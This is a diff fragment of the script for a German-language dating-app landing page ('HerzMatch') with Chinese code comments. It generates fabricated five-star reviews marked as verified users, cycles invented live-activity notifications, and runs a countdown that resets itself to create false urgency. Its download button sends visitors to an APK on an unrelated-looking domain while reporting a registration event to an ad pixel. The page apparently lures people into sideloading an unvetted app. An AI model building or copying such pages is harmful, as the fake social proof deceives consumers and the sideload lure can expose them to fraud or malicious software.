+      { type: "download", avatar: "https://images.unsplash.com/photo-1502823403499-6ccfcf4fb453?w=100", title: "Neuer Download", desc: "Tim aus Frankfurt hat die VIP-Funktion freigeschaltet! ✨" }
+    ];
+
+    let toastIndex = 0;
+    function showNextToast() {
+      const toastContainer = document.getElementById('liveActivityToast');
+      if (!toastContainer) return;
+
+      const item = LIVE_BROADCASTS[toastIndex % LIVE_BROADCASTS.length];
+      toastIndex++;
+
+      const toast = document.createElement('div');
+      toast.className = 'glass-heart-card toast-anim px-3 py-2 rounded-2xl flex items-center space-x-2.5 shadow-xl border border-rose-300/40 max-w-[280px] bg-white/95';
+      toast.innerHTML = `
+        <div class="relative flex-shrink-0">
+          <img src="${item.avatar}" class="w-8 h-8 rounded-full object-cover border border-rose-400">
+          <span class="absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 rounded-full ${item.type === 'match' ? 'bg-rose-500' : item.type === 'chat' ? 'bg-pink-500' : 'bg-emerald-500'} border-2 border-white"></span>
+        </div>
+        <div class="min-w-0 text-left">
+          <div class="text-[11px] font-bold text-slate-900 truncate leading-tight">${item.title}</div>
+          <div class="text-[9.5px] text-rose-600 font-medium truncate leading-tight mt-0.5">${item.desc}</div>
+        </div>
+      `;
+
+      toastContainer.innerHTML = '';
+      toastContainer.appendChild(toast);
+
+      setTimeout(() => {
+        if (toastContainer.contains(toast)) {
+          toastContainer.innerHTML = '';
+        }
+      }, 3600);
+    }
+
+    // 評論模組
+    const FIRST_NAMES_DE = ["Max", "Lukas", "Leon", "Felix", "David", "Florian", "Niklas", "Jonas"];
+    const CITIES_DE = ["Berlin", "München", "Hamburg", "Köln", "Frankfurt", "Stuttgart"];
+    const DEVICES_DE = ["Samsung S24+", "iPhone 15 Pro", "Pixel 8 Pro", "Xiaomi 14", "OnePlus 12"];
+    const COMMENTS_DE = [
+      "Wahnsinn! Innerhalb von 10 Minuten mit Sophie aus München gechattet. Heute Abend treffen wir uns auf ein Glas Wein!",
+      "Endlich eine Dating-App ohne 30€ Abo-Falle. Die Mädels antworten echt in Minuten.",
+      "War erst skeptisch, aber nach 2 Tagen schon ein mega schönes Date in Berlin gehabt.",
+      "Die Profile sind zu 100% echt. Viel persönlicher und schneller als Tinder!"
+    ];
+
+    let allReviews = [];
+    function generateReviews() {
+      for (let i = 0; i < 48; i++) {
+        const name = FIRST_NAMES_DE[i % FIRST_NAMES_DE.length] + " " + String.fromCharCode(65 + (i % 26)) + ".";
+        const city = CITIES_DE[i % CITIES_DE.length];
+        const device = DEVICES_DE[i % DEVICES_DE.length];
+        const text = COMMENTS_DE[i % COMMENTS_DE.length];
+        const time = `vor ${(i % 12) + 1} Std.`;
+        allReviews.push({ name, city, device, text, time });
+      }
+    }
+
+    let displayedReviewCount = 0;
+    function renderReviews(batchSize) {
+      const container = document.getElementById('reviewsContainer');
+      const nextBatch = allReviews.slice(displayedReviewCount, displayedReviewCount + batchSize);
+      
+      const html = nextBatch.map(r => `
+        <div class="glass-heart-card p-3 rounded-2xl text-left bg-white/70">
+          <div class="flex justify-between items-center text-xs">
+            <div class="flex items-center space-x-1.5">
+              <span class="font-bold text-slate-800">${r.name}</span>
+              <span class="text-[10px] text-slate-400">(${r.city})</span>
+              <span class="text-[10px] bg-rose-50 text-rose-600 px-1.5 py-0.5 rounded-full font-mono border border-rose-100">${r.device}</span>
+            </div>
+            <span class="text-amber-500 text-[11px] tracking-tight">★★★★★</span>
+          </div>
+          <p class="text-xs text-slate-600 mt-1.5 leading-relaxed">${r.text}</p>
+          <div class="text-[10px] text-rose-400 mt-1 font-medium">${r.time} · Verifizierter Nutzer</div>
+        </div>
+      `).join('');
+
+      container.insertAdjacentHTML('beforeend', html);
+      displayedReviewCount += nextBatch.length;
+
+      const remaining = allReviews.length - displayedReviewCount;
+      const loadBtn = document.getElementById('loadMoreBtn');
+      if (remaining <= 0) {
+        loadBtn.style.display = 'none';
+      }
+    }
+
+    function loadMoreReviews() {
+      renderReviews(4);
+    }
+
+    // 觸發下載（多像素回傳）
+    const DOWNLOAD_URL = "https://iuoocj8q2s57.zombielegend.com/qK4wbA8Iedks";
+
+    function triggerSmartDownload() {
+      if (typeof fbq === 'function') {
+        fbq('track', 'CompleteRegistration', {
+          content_name: 'HerzMatch Dating APK Download',
+          status: true
+        });
+      }
+      window.location.href = DOWNLOAD_URL;
+    }
+
+    // 動態倒數計時器
+    function startCountdown() {
+      let duration = 14 * 60 + 59;
+      const display = document.getElementById('countdown');
+      setInterval(() => {
+        let minutes = parseInt(duration / 60, 10);
+        let seconds = parseInt(duration % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--duration < 0) duration = 15 * 60;
+      }, 1000);
+    }
+
+    // 彈窗開關
+    function openModal(modalId) {
+      document.getElementById(modalId).classList.remove('hidden');
+    }
+    function closeModal(modalId) {
+      document.getElementById(modalId).classList.add('hidden');
+    }
+
+    // 頁面初始化
+    window.addEventListener('DOMContentLoaded', () => {
+      switchCategory('nearby');
+      generateReviews();
+      renderReviews(3);
+      startCountdown();
+
+      // 啟動實時心動播報輪播（每 4.8 秒播報一次新動態）
+      setTimeout(showNextToast, 800);
+      setInterval(showNextToast, 4800);
+    });
+  </script>
+</body>
+</html>
